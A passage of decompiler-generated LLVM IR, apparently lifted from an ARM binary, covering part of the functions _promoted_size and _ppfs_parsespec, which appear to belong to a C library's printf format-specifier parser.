  uselistorder i32 %v0_10b68.be, { 1, 0 }
  uselistorder i32 %v0_10c30, { 1, 2, 0 }
  uselistorder i32 %v3_10b70, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_10b70, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_10b60, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_10b6823, { 1, 0 }
  uselistorder i32 %v0_10c3024, { 0, 2, 1 }
  uselistorder i32 %v0_10c3017, { 2, 0, 1 }
  uselistorder i32 %v0_10af4, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_10c98, { 1, 0 }
  uselistorder label %dec_label_pc_10c3c, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10c2c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10c1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10bfc, { 1, 0 }
  uselistorder label %dec_label_pc_10be8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_10b5c, { 1, 0 }
  uselistorder label %dec_label_pc_10b50, { 1, 0 }
  uselistorder label %dec_label_pc_10b28, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_10cc0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10cc8, %entry
  %v0_10cbc = phi i32 [ %v1_10cbc, %dec_label_pc_10cc8 ], [ add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -38126), %entry ]
  %v1_10cbc = add i32 %v0_10cbc, -2
  %v2_10cbc = inttoptr i32 %v1_10cbc to i16*
  %v3_10cbc = load i16, i16* %v2_10cbc, align 2
  %v4_10cbc = sext i16 %v3_10cbc to i32
  store i32 %v1_10cbc, i32* @ip, align 4
  %v9_10cc0 = icmp eq i32 %v4_10cbc, %v1_10cc0.pre
  br i1 %v9_10cc0, label %dec_label_pc_10cbc.dec_label_pc_10cd0_crit_edge, label %dec_label_pc_10cc8

dec_label_pc_10cbc.dec_label_pc_10cd0_crit_edge:  ; preds = %dec_label_pc_10cbc
  br label %dec_label_pc_10cd0

dec_label_pc_10cc8:                               ; preds = %dec_label_pc_10cbc
  %tmp = icmp ugt i32 %v1_10cbc, add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -38150)
  br i1 %tmp, label %dec_label_pc_10cbc, label %dec_label_pc_10cd0.loopexit

dec_label_pc_10cd0.loopexit:                      ; preds = %dec_label_pc_10cc8
  br label %dec_label_pc_10cd0

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_10cd0.loopexit, %dec_label_pc_10cbc.dec_label_pc_10cd0_crit_edge
  %v2_10ce0.pre-phi = sub i32 %v1_10cbc, add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -38150)
  store i32 %v2_10ce0.pre-phi, i32* @r2, align 4
  %v4_10ce4 = sdiv i32 %v2_10ce0.pre-phi, 2
  %v5_10ce4 = add i32 %v4_10ce4, add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -38126)
  %v6_10ce4 = inttoptr i32 %v5_10ce4 to i8*
  %v7_10ce4 = load i8, i8* %v6_10ce4, align 1
  %v9_10ce4 = zext i8 %v7_10ce4 to i32
  ret i32 %v9_10ce4

; uselistorder directives
  uselistorder i32 %v2_10ce0.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10cbc, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -38150), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10cf8 = load i32, i32* @r4, align 4
  store i32 %v3_10cf8, i32* %stack_var_-36, align 4
  %v6_10cf8 = load i32, i32* @r5, align 4
  %v27_10cf8 = load i32, i32* @lr, align 4
  %v0_10cfc = load i32, i32* %r0.global-to-local, align 4
  %v1_10cfc = add i32 %v0_10cfc, 16
  %v2_10cfc = inttoptr i32 %v1_10cfc to i32*
  %v3_10cfc = load i32, i32* %v2_10cfc, align 4
  %v1_10d04 = and i32 %v3_10cfc, 128
  store i32 %v1_10d04, i32* @r4, align 4
  %v2_10d04 = icmp eq i32 %v1_10d04, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_10cfc, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @lr, align 4
  %v1_10d2c = add i32 %v0_10cfc, 24
  %v2_10d2c = inttoptr i32 %v1_10d2c to i32*
  %v3_10d2c = load i32, i32* %v2_10d2c, align 4
  store i32 %v3_10d2c, i32* %fp.global-to-local, align 4
  br i1 %v2_10d04, label %.dec_label_pc_10d80_crit_edge, label %dec_label_pc_10d38

.dec_label_pc_10d80_crit_edge:                    ; preds = %entry
  %v2_10d30 = inttoptr i32 %v0_10cfc to i32*
  %v3_10d30 = load i32, i32* %v2_10d30, align 4
  store i32 %v3_10d30, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10d80

dec_label_pc_10d38:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10d48 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10d3c

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10d6c.dec_label_pc_10d3c_crit_edge, %dec_label_pc_10d38
  %v1_10d4c = phi i32 [ %v1_10d5c, %dec_label_pc_10d6c.dec_label_pc_10d3c_crit_edge ], [ 0, %dec_label_pc_10d38 ]
  %v0_10d3c = phi i32 [ %v0_10d3c.pre, %dec_label_pc_10d6c.dec_label_pc_10d3c_crit_edge ], [ %v0_10cfc, %dec_label_pc_10d38 ]
  %v1_10d3c = inttoptr i32 %v0_10d3c to i32*
  %v2_10d3c = load i32, i32* %v1_10d3c, align 4
  %v4_10d40 = mul i32 %v1_10d4c, 4
  %v5_10d40 = add i32 %v2_10d3c, %v4_10d40
  store i32 %v5_10d40, i32* %r3.global-to-local, align 4
  %v1_10d44 = add i32 %v5_10d40, -4
  %v2_10d44 = inttoptr i32 %v1_10d44 to i8*
  %v3_10d44 = load i8, i8* %v2_10d44, align 1
  %v4_10d44 = zext i8 %v3_10d44 to i32
  store i32 %v4_10d44, i32* %r1.global-to-local, align 4
  store i32 %v2_10d48, i32* @ip, align 4
  %v2_10d4c = add i32 %v1_10d4c, %v2_10d48
  store i32 %v2_10d4c, i32* %r2.global-to-local, align 4
  %v3_10d50 = add i32 %v2_10d4c, -72
  %v4_10d50 = inttoptr i32 %v3_10d50 to i8*
  store i8 %v3_10d44, i8* %v4_10d50, align 1
  %v0_10d54 = load i32, i32* %r3.global-to-local, align 4
  %v1_10d54 = add i32 %v0_10d54, -4
  %v2_10d54 = inttoptr i32 %v1_10d54 to i32*
  %v3_10d54 = load i32, i32* %v2_10d54, align 4
  store i32 %v3_10d54, i32* %r3.global-to-local, align 4
  %v0_10d58 = load i32, i32* %r1.global-to-local, align 4
  %v9_10d58 = icmp eq i32 %v0_10d58, %v3_10d54
  %v0_10d5c = load i32, i32* %r0.global-to-local, align 4
  %v1_10d5c = add i32 %v0_10d5c, 1
  store i32 %v1_10d5c, i32* %r0.global-to-local, align 4
  br i1 %v9_10d58, label %dec_label_pc_10d64, label %dec_label_pc_11228

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10d3c
  %v2_10d64 = icmp eq i32 %v3_10d54, 0
  br i1 %v2_10d64, label %dec_label_pc_10d74, label %dec_label_pc_10d6c

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d64
  %tmp182 = icmp ult i32 %v1_10d5c, 32
  br i1 %tmp182, label %dec_label_pc_10d6c.dec_label_pc_10d3c_crit_edge, label %dec_label_pc_10d74

dec_label_pc_10d6c.dec_label_pc_10d3c_crit_edge:  ; preds = %dec_label_pc_10d6c
  %v0_10d3c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10d3c

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d6c, %dec_label_pc_10d64
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10d7c = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_10d7c, i32* %r0.global-to-local, align 4
  %v0_10d8c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_10d80

dec_label_pc_10d80:                               ; preds = %.dec_label_pc_10d80_crit_edge, %dec_label_pc_10d74
  %v3_10db4.pre-phi = phi i32 [ %.pre, %.dec_label_pc_10d80_crit_edge ], [ %v2_10d48, %dec_label_pc_10d74 ]
  %v0_10dac64 = phi i32 [ %v3_10d30, %.dec_label_pc_10d80_crit_edge ], [ %v2_10d7c, %dec_label_pc_10d74 ]
  %v0_10d8c = phi i32 [ ptrtoint (i16* @global_var_26010.295 to i32), %.dec_label_pc_10d80_crit_edge ], [ %v0_10d8c.pre, %dec_label_pc_10d74 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 524, i32* %r2.global-to-local, align 4
  %v2_10d8c = add i32 %v0_10d8c, -38088
  store i32 %v2_10d8c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_10da0 = inttoptr i32 %v2_10d8c to i8*
  store i8* %v4_10da0, i8** %stack_var_-120, align 4
  br label %dec_label_pc_10dac

dec_label_pc_10da8:                               ; preds = %.thread20, %dec_label_pc_10edc
  %v0_10da8 = phi i32 [ %v2_10f54, %.thread20 ], [ %v0_10eb876, %dec_label_pc_10edc ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_10edc ]
  store i32 %v0_10da8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10dac

dec_label_pc_10dac:                               ; preds = %dec_label_pc_10d80, %dec_label_pc_10da8
  %v1_10dc0 = phi i32 [ %v0_10dac64, %dec_label_pc_10d80 ], [ %v0_10da8, %dec_label_pc_10da8 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_10d80 ], [ %stack_var_-44.0, %dec_label_pc_10da8 ]
  %v1_10dac = inttoptr i32 %v1_10dc0 to i8*
  %v2_10dac = load i8, i8* %v1_10dac, align 1
  %v3_10dac = zext i8 %v2_10dac to i32
  store i32 %v3_10dac, i32* %r3.global-to-local, align 4
  %v7_10db0 = icmp eq i8 %v2_10dac, 42
  br i1 %v7_10db0, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_10dac
  store i32 %v1_10dc0, i32* %r6.global-to-local, align 4
  %v0_10dc4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10dc4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10e0c.preheader

bb:                                               ; preds = %dec_label_pc_10dac
  %v1_10db8 = load i32, i32* %r8.global-to-local, align 4
  %v2_10db8 = load i32, i32* %sb.global-to-local, align 4
  %v4_10db8 = mul i32 %v2_10db8, %v1_10db8
  %v5_10db8 = add i32 %v4_10db8, %v3_10db4.pre-phi
  store i32 %v5_10db8, i32* %r3.global-to-local, align 4
  %v2_10dc0 = add i32 %v1_10dc0, 1
  store i32 %v2_10dc0, i32* %r6.global-to-local, align 4
  %v0_10dc4111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10dc4111, i32* %r1.global-to-local, align 4
  %v3_10dc8 = add i32 %v5_10db8, -40
  %v4_10dc8 = inttoptr i32 %v3_10dc8 to i32*
  store i32 %v0_10dc4111, i32* %v4_10dc8, align 4
  %v0_10e10.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10e0c.preheader

dec_label_pc_10e0c.preheader:                     ; preds = %.thread8, %bb
  %v0_10e10.pre = phi i32 [ %v1_10dc0, %.thread8 ], [ %v0_10e10.pre.pre, %bb ]
  %v0_10e14.pre = load i32, i32* @lr, align 4
  %v2_10e14 = add i32 %v0_10e14.pre, 524
  %v3_10e14 = inttoptr i32 %v2_10e14 to i32*
  br label %dec_label_pc_10e0c

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10e0c
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_10dd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_10dd4 = add i32 %v0_10dd4, -214748363
  %tmp139 = sub i32 214748362, %v0_10dd4
  %v6_10dd4 = and i32 %tmp139, %v0_10dd4
  %v7_10dd4 = icmp slt i32 %v6_10dd4, 0
  %v8_10dd4 = icmp slt i32 %v2_10dd4, 0
  %v9_10dd4 = icmp eq i32 %v0_10dd4, 214748363
  %v3_10dd8 = xor i1 %v8_10dd4, %v7_10dd4
  %v4_10dd8 = or i1 %v9_10dd4, %v3_10dd8
  br i1 %v4_10dd8, label %dec_label_pc_10df0, label %dec_label_pc_10ddc

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10dd0
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_10de0 = icmp eq i32 %v0_10dd4, 214748364
  br i1 %v9_10de0, label %dec_label_pc_10de8, label %dec_label_pc_10e08

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10ddc
  %v8_10dec = icmp ugt i8 %v2_10e10, 55
  br i1 %v8_10dec, label %dec_label_pc_10e08, label %dec_label_pc_10df0

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10de8, %dec_label_pc_10dd0
  %v2_10df4 = mul i32 %v0_10dd4, 10
  %v1_10df8 = add i32 %v2_10df4, -48
  store i32 %v1_10df8, i32* %r3.global-to-local, align 4
  %v2_10dfc = add i32 %v1_10df8, %v3_10e10
  br label %dec_label_pc_10e08

dec_label_pc_10e08:                               ; preds = %dec_label_pc_10de8, %dec_label_pc_10ddc, %dec_label_pc_10df0
  %storemerge = phi i32 [ %v2_10dfc, %dec_label_pc_10df0 ], [ 2147483647, %dec_label_pc_10ddc ], [ 2147483647, %dec_label_pc_10de8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_10e08 = add i32 %v0_10e90, 1
  store i32 %v1_10e08, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10e0c.preheader, %dec_label_pc_10e08
  %v0_10e90 = phi i32 [ %v0_10e10.pre, %dec_label_pc_10e0c.preheader ], [ %v1_10e08, %dec_label_pc_10e08 ]
  store i32 524, i32* %r2.global-to-local, align 4
  %v1_10e10 = inttoptr i32 %v0_10e90 to i8*
  %v2_10e10 = load i8, i8* %v1_10e10, align 1
  %v3_10e10 = zext i8 %v2_10e10 to i32
  store i32 %v3_10e10, i32* @ip, align 4
  %v4_10e14 = load i32, i32* %v3_10e14, align 4
  store i32 %v4_10e14, i32* %r3.global-to-local, align 4
  %v2_10e18 = mul nuw nsw i32 %v3_10e10, 2
  store i32 %v2_10e18, i32* %r2.global-to-local, align 4
  %v2_10e1c = add i32 %v2_10e18, %v4_10e14
  %v3_10e1c = inttoptr i32 %v2_10e1c to i16*
  %v4_10e1c = load i16, i16* %v3_10e1c, align 2
  %v6_10e1c = zext i16 %v4_10e1c to i32
  store i32 %v6_10e1c, i32* %r3.global-to-local, align 4
  %v1_10e20 = and i32 %v6_10e1c, 8
  %v2_10e20 = icmp eq i32 %v1_10e20, 0
  br i1 %v2_10e20, label %dec_label_pc_10e28, label %dec_label_pc_10dd0

dec_label_pc_10e28:                               ; preds = %dec_label_pc_10e0c
  %v0_10e28 = load i32, i32* %r0.global-to-local, align 4
  %v1_10e28 = add i32 %v0_10e28, -1
  %v2_10e28 = inttoptr i32 %v1_10e28 to i8*
  %v3_10e28 = load i8, i8* %v2_10e28, align 1
  %v4_10e28 = zext i8 %v3_10e28 to i32
  store i32 %v4_10e28, i32* %r3.global-to-local, align 4
  %v7_10e2c = icmp eq i8 %v3_10e28, 37
  br i1 %v7_10e2c, label %dec_label_pc_10e34, label %dec_label_pc_10ef4

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e28
  %v7_10e34 = icmp eq i8 %v2_10e10, 36
  %. = zext i1 %v7_10e34 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_10e40 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_10e40, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_10e34
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10e34, %bb144
  %v0_10e48 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_10e34 ]
  %v2_10e48 = icmp eq i32 %v0_10e48, 0
  %v0_10e7c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_10e48, label %dec_label_pc_10e7c, label %dec_label_pc_10e50

dec_label_pc_10e50:                               ; preds = %thread-pre-split
  %v2_10e7c = icmp eq i32 %v0_10e7c, 0
  %v1_10e54 = add i32 %v0_10e90, 1
  store i32 %v1_10e54, i32* %r0.global-to-local, align 4
  br i1 %v2_10e7c, label %dec_label_pc_11228, label %dec_label_pc_10e5c

dec_label_pc_10e5c:                               ; preds = %dec_label_pc_10e50
  %v2_10e5c = sub i32 %v0_10e40, %v0_10e7c
  %v4_10e5c = xor i32 %v0_10e7c, %v0_10e40
  %v5_10e5c = xor i32 %v2_10e5c, %v0_10e40
  %v6_10e5c = and i32 %v5_10e5c, %v4_10e5c
  %v7_10e5c = icmp slt i32 %v6_10e5c, 0
  %v8_10e5c = icmp slt i32 %v2_10e5c, 0
  %v9_10e5c = icmp eq i32 %v0_10e40, %v0_10e7c
  %v3_10e60 = xor i1 %v8_10e5c, %v7_10e5c
  %v4_10e60 = or i1 %v9_10e5c, %v3_10e60
  br i1 %v4_10e60, label %dec_label_pc_10e70, label %bb145

bb145:                                            ; preds = %dec_label_pc_10e5c
  store i32 %v0_10e40, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10e70

dec_label_pc_10e6c:                               ; preds = %dec_label_pc_10e90, %dec_label_pc_10e98
  %v0_10e6c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10e6c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10e70

dec_label_pc_10e70:                               ; preds = %bb145, %dec_label_pc_10e5c, %dec_label_pc_10e6c
  %v0_10e70 = phi i32 [ %v0_10e28, %dec_label_pc_10e6c ], [ %v1_10e54, %dec_label_pc_10e5c ], [ %v1_10e54, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_10e6c ], [ %v0_10e40, %dec_label_pc_10e5c ], [ %v0_10e40, %bb145 ]
  store i32 %v0_10e70, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_10eac.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_10eac = ptrtoint i8* %v2_10eac.pre to i32
  br label %dec_label_pc_10eac

dec_label_pc_10e7c:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_10e7c, 1
  br i1 %tmp146, label %dec_label_pc_10e90, label %dec_label_pc_10e84

dec_label_pc_10e84:                               ; preds = %dec_label_pc_10e7c
  %v7_10e84 = icmp eq i8 %v2_10e10, 109
  br i1 %v7_10e84, label %dec_label_pc_10ef4, label %dec_label_pc_11228

dec_label_pc_10e90:                               ; preds = %dec_label_pc_10e7c
  %tmp183 = icmp ugt i32 %v0_10e90, %v0_10e28
  br i1 %tmp183, label %dec_label_pc_10e98, label %dec_label_pc_10e6c

dec_label_pc_10e98:                               ; preds = %dec_label_pc_10e90
  %v1_10e98 = inttoptr i32 %v0_10e28 to i8*
  %v2_10e98 = load i8, i8* %v1_10e98, align 1
  %v3_10e98 = zext i8 %v2_10e98 to i32
  store i32 %v3_10e98, i32* %r3.global-to-local, align 4
  %v7_10e9c = icmp eq i8 %v2_10e98, 48
  br i1 %v7_10e9c, label %dec_label_pc_10e6c, label %bb147

bb147:                                            ; preds = %dec_label_pc_10e98
  %v1_10ea0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_10ea0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10ef4

dec_label_pc_10eac.loopexit:                      ; preds = %dec_label_pc_10eb4
  %v1_10ec0 = load i32, i32* @r4, align 4
  %v3_10ec0 = or i32 %v1_10ec0, %v0_10ed4
  store i32 %v3_10ec0, i32* @r4, align 4
  %v2_10ec4 = add i32 %v0_10eb876, 1
  store i32 %v2_10ec4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10eac

dec_label_pc_10eac:                               ; preds = %dec_label_pc_10eac.loopexit, %dec_label_pc_10e70
  %v0_10eb876 = phi i32 [ %v2_10ec4, %dec_label_pc_10eac.loopexit ], [ %v0_10e70, %dec_label_pc_10e70 ]
  store i32 %v3_10eac, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_10eb8 = inttoptr i32 %v0_10eb876 to i8*
  br label %dec_label_pc_10eb4

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10ecc, %dec_label_pc_10eac
  %v0_10ed4 = phi i32 [ %v2_10ed4, %dec_label_pc_10ecc ], [ 1, %dec_label_pc_10eac ]
  %v0_10eb4 = phi i32 [ %v5_10eb4, %dec_label_pc_10ecc ], [ %v3_10eac, %dec_label_pc_10eac ]
  %v1_10eb4 = inttoptr i32 %v0_10eb4 to i8*
  %v2_10eb4 = load i8, i8* %v1_10eb4, align 1
  %v3_10eb4 = zext i8 %v2_10eb4 to i32
  store i32 %v3_10eb4, i32* %r2.global-to-local, align 4
  %v5_10eb4 = add i32 %v0_10eb4, 1
  store i32 %v5_10eb4, i32* %r0.global-to-local, align 4
  %v2_10eb8 = load i8, i8* %v1_10eb8, align 1
  %v3_10eb8 = zext i8 %v2_10eb8 to i32
  store i32 %v3_10eb8, i32* %r3.global-to-local, align 4
  %v9_10ebc = icmp eq i8 %v2_10eb8, %v2_10eb4
  br i1 %v9_10ebc, label %dec_label_pc_10eac.loopexit, label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10eb4
  %v1_10ecc = inttoptr i32 %v5_10eb4 to i8*
  %v2_10ecc = load i8, i8* %v1_10ecc, align 1
  %v3_10ecc = zext i8 %v2_10ecc to i32
  store i32 %v3_10ecc, i32* %r3.global-to-local, align 4
  %v2_10ed0 = icmp eq i8 %v2_10ecc, 0
  %v2_10ed4 = mul i32 %v0_10ed4, 2
  store i32 %v2_10ed4, i32* %r1.global-to-local, align 4
  br i1 %v2_10ed0, label %dec_label_pc_10edc, label %dec_label_pc_10eb4

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10ecc
  %v1_10edc = add i32 %v0_10eb876, -1
  %v2_10edc = inttoptr i32 %v1_10edc to i8*
  %v3_10edc = load i8, i8* %v2_10edc, align 1
  %v7_10ee0 = icmp eq i8 %v3_10edc, 37
  %v0_10ee4 = load i32, i32* @r4, align 4
  %v1_10ee4 = and i32 %v0_10ee4, 10
  store i32 %v1_10ee4, i32* %r3.global-to-local, align 4
  %v4_10ee8 = udiv i32 %v1_10ee4, 2
  %v5_10ee8 = sub nuw nsw i32 -1, %v4_10ee8
  %v6_10ee8 = and i32 %v0_10ee4, %v5_10ee8
  store i32 %v6_10ee8, i32* @r4, align 4
  br i1 %v7_10ee0, label %dec_label_pc_10ef0, label %dec_label_pc_10da8

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_10edc
  %v0_10ef0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10ef0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10ef4

dec_label_pc_10ef4:                               ; preds = %bb147, %dec_label_pc_10e28, %dec_label_pc_10e84, %dec_label_pc_10ef0
  %v1_10f34 = phi i32 [ %v0_10eb876, %dec_label_pc_10ef0 ], [ %v0_10e90, %bb147 ], [ %v0_10e90, %dec_label_pc_10e84 ], [ %v0_10e90, %dec_label_pc_10e28 ]
  %v0_10f30 = phi i32 [ %v5_10eb4, %dec_label_pc_10ef0 ], [ %v0_10e28, %bb147 ], [ %v0_10e28, %dec_label_pc_10e84 ], [ %v0_10e28, %dec_label_pc_10e28 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_10ef0 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_10e84 ], [ %stack_var_-44.1, %dec_label_pc_10e28 ]
  %v1_10ef4 = inttoptr i32 %v0_10f30 to i8*
  %v2_10ef4 = load i8, i8* %v1_10ef4, align 1
  %v3_10ef4 = zext i8 %v2_10ef4 to i32
  store i32 %v3_10ef4, i32* %r3.global-to-local, align 4
  %v7_10ef8 = icmp eq i8 %v2_10ef4, 42
  br i1 %v7_10ef8, label %dec_label_pc_10f00, label %dec_label_pc_10f40

dec_label_pc_10f00:                               ; preds = %dec_label_pc_10ef4
  %v0_10f00 = load i32, i32* %fp.global-to-local, align 4
  %v2_10f00 = icmp eq i32 %v0_10f00, 0
  br i1 %v2_10f00, label %dec_label_pc_10f30, label %dec_label_pc_10f08

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10f00
  %v1_10f08 = inttoptr i32 %v1_10f34 to i8*
  %v2_10f08 = load i8, i8* %v1_10f08, align 1
  %v3_10f08 = zext i8 %v2_10f08 to i32
  store i32 %v3_10f08, i32* %r3.global-to-local, align 4
  %v7_10f0c = icmp eq i8 %v2_10f08, 36
  br i1 %v7_10f0c, label %dec_label_pc_10f14, label %dec_label_pc_11228

dec_label_pc_10f14:                               ; preds = %dec_label_pc_10f08
  %v0_10f14 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_10f14, 1
  br i1 %tmp148, label %dec_label_pc_11228, label %dec_label_pc_10f1c

dec_label_pc_10f1c:                               ; preds = %dec_label_pc_10f14
  %v0_10f20 = load i32, i32* %r8.global-to-local, align 4
  %v1_10f20 = load i32, i32* %sb.global-to-local, align 4
  %v3_10f20 = mul i32 %v1_10f20, %v0_10f20
  %v4_10f20 = add i32 %v3_10f20, %v3_10db4.pre-phi
  store i32 %v4_10f20, i32* %r3.global-to-local, align 4
  %v1_10f24 = add i32 %v1_10f34, 1
  store i32 %v1_10f24, i32* %r6.global-to-local, align 4
  %v2_10f28 = add i32 %v4_10f20, -12
  %v3_10f28 = inttoptr i32 %v2_10f28 to i32*
  store i32 %v0_10f14, i32* %v3_10f28, align 4
  br label %dec_label_pc_10f3c

dec_label_pc_10f30:                               ; preds = %dec_label_pc_10f00
  %v1_10f30 = add i32 %v0_10f30, 1
  store i32 %v1_10f30, i32* %r3.global-to-local, align 4
  %v9_10f34 = icmp eq i32 %v1_10f30, %v1_10f34
  br i1 %v9_10f34, label %dec_label_pc_10f3c, label %dec_label_pc_11228

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f30, %dec_label_pc_10f1c
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10f40

dec_label_pc_10f40:                               ; preds = %dec_label_pc_10ef4, %dec_label_pc_10f3c
  %v0_10f40 = load i32, i32* %r8.global-to-local, align 4
  %v2_10f40 = icmp eq i32 %v0_10f40, 0
  br i1 %v2_10f40, label %dec_label_pc_10f4c, label %dec_label_pc_10f6c.loopexit

dec_label_pc_10f4c:                               ; preds = %dec_label_pc_10f40
  %v0_10f4c = load i32, i32* %r6.global-to-local, align 4
  %v1_10f4c = inttoptr i32 %v0_10f4c to i8*
  %v2_10f4c = load i8, i8* %v1_10f4c, align 1
  %v3_10f4c = zext i8 %v2_10f4c to i32
  store i32 %v3_10f4c, i32* %r3.global-to-local, align 4
  %v7_10f50 = icmp eq i8 %v2_10f4c, 46
  br i1 %v7_10f50, label %.thread20, label %dec_label_pc_10f64

.thread20:                                        ; preds = %dec_label_pc_10f4c
  %v2_10f54 = add i32 %v0_10f4c, 1
  store i32 %v2_10f54, i32* %r6.global-to-local, align 4
  %v1_10f58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_10f58, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10da8

dec_label_pc_10f64:                               ; preds = %dec_label_pc_10f4c
  %v0_10f64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10f64, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_10f6c

dec_label_pc_10f6c.loopexit:                      ; preds = %dec_label_pc_10f40
